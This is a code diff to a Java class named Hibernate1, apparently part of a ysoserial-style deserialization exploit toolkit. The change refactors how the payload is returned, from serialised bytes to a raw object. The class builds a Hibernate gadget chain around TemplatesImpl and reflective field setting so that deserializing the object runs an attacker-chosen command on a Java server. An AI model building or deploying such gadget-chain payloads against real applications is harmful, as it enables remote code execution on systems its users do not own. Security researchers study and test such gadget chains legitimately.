@@ -99,15 +99,10 @@ public class Hibernate1 implements ObjectPayload<Object>, DynamicDependencies{
     }
 
 
-    public byte[] getBytes(PayloadType type, String... param) throws Exception {
+    public Object getObject(PayloadType type, String... param) throws Exception {
         Object tpl = Gadgets.createTemplatesImpl(type, param);
         Object getters = makeGetter(tpl.getClass(), "getOutputProperties");
-        return (byte[]) makeCaller(tpl, getters);
-    }
-
-    @Override
-    public Object getObject(String command) throws Exception {
-        return null;
+        return makeCaller(tpl, getters);
     }
 
 
@@ -140,13 +135,7 @@ public class Hibernate1 implements ObjectPayload<Object>, DynamicDependencies{
         Reflections.setFieldValue(v2, "value", tpl);
         Reflections.setFieldValue(v2, "type", t);
 
-        ByteArrayOutputStream baous = new ByteArrayOutputStream();
-        ObjectOutputStream    oos   = new ObjectOutputStream(baous);
-        oos.writeObject(Gadgets.makeMap(v1, v2));
-        byte[] bytes = baous.toByteArray();
-        oos.close();
-
-        return bytes;
+        return Gadgets.makeMap(v1, v2);
     }
 
 
@@ -180,12 +169,6 @@ public class Hibernate1 implements ObjectPayload<Object>, DynamicDependencies{
         Reflections.setFieldValue(v2, "value", tpl);
         Reflections.setFieldValue(v2, "type", t);
 
-        ByteArrayOutputStream baous = new ByteArrayOutputStream();
-        ObjectOutputStream    oos   = new ObjectOutputStream(baous);
-        oos.writeObject(Gadgets.makeMap(v1, v2));
-        byte[] bytes = baous.toByteArray();
-        oos.close();
-
-        return bytes;
+        return Gadgets.makeMap(v1, v2);
     }
 }
